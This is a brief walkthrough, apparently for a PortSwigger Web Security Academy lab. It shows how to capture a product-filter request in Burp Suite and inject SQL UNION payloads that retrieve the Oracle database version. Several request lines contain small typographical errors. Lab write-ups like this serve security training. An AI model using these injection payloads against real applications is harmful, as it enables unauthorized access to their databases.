# Step 1: Start the lab

Click **ACCESS THE LAB**.

Wait until the vulnerable shopping application opens.

---

# Step 2: Capture the request

1. Open **Burp Suite**.
2. Go to **Proxy → Intercept**.
3. Turn **Intercept ON**.
4. In the browser, click any **product category** (for example: Gifts, Pets, Tech).

Burp should capture a request similar to:

```
GET /filter?category=Lifestyle'HTTP/2
Host: 0aaa00d4031668f180541264001200a4.web-security-academy.net
Cookie: session=1w2jyj3dEobN2hKnYEzNim85YOEWq8H6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aaa00d4031668f180541264001200a4.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

The important part is the **category** parameter.

---

# Step 3: Send to Repeater

Right-click the intercepted request.

Choose:

```
Send to Repeater
```

Then click the **Repeater** tab.

---

# Step 4: insert following

Near the top of the request you'll see something like:

```
GET /filter?category=Lifestyle'+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/2
```

<img width="1277" height="769" alt="Screenshot 2026-08-03 at 11 49 48 AM" src="https://github.com/user-attachments/assets/00f793bf-f89b-4ab9-b225-7f6cc8183871" />


Next:

something like:

```
GET /filter?category=Lifestyle'+UNION+SELECT+BANNER,+NULL+FROM+v$version--$ HTTP/2
```
Now Refresh

<img width="1280" height="736" alt="Screenshot 2026-08-03 at 11 51 19 AM" src="https://github.com/user-attachments/assets/af3a688b-f12a-4960-89bc-b6348a96299c" />

<img width="1275" height="724" alt="Screenshot 2026-08-03 at 11 53 35 AM" src="https://github.com/user-attachments/assets/6fb96045-067c-4c81-9783-9e373e0e517e" />
